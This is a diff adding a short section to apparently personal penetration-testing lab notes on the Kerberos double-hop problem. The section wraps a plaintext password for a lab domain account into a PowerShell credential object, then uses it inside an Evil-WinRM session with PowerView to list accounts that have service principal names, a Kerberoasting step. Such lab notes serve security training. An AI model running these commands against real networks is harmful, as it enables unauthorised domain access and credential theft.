@@ -21,3 +21,16 @@ So **bizintel** is listening on port 5446 and will forward requests hitting 5446
 
 
 all is here: https://posts.slayerlabs.com/double-hop/
+
+---
+## Workaround #1: PSCredential Object
+```bash
+$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
+
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
+
+#now we load it, $cred is important
+*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1
+get-domainuser -spn -credential $Cred | select samaccountname
+
+```
